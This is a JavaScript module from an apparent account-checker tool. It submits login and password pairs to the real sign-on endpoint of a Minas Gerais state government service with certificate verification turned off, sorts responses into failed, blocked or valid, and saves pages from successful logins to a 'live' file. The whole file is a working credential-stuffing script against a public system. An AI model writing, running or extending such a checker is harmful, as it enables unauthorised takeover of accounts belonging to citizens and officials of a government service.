import axios from "axios";
import https from 'https'
import request from '../core/configs.js'
import { writeFileSync } from "fs";

export default async function sccMg(login, pass) {

  const url = 'https://ssc.prodemge.gov.br/ssc-idp-frontend/j_security_check'

  
  const dataRequest = `isIFrame=false&baseURI=&j_username=${login}&j_password=${pass}`;

  const { data } = await axios({
    method: "POST",
    headers: request.headers,
    data: dataRequest,
    url: url,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false 
      }),

  });


  if (data.includes('e senha n') || data.includes('Esse usuário está bloqueado.'))
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
    writeFileSync('sccLive.txt', data)
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}


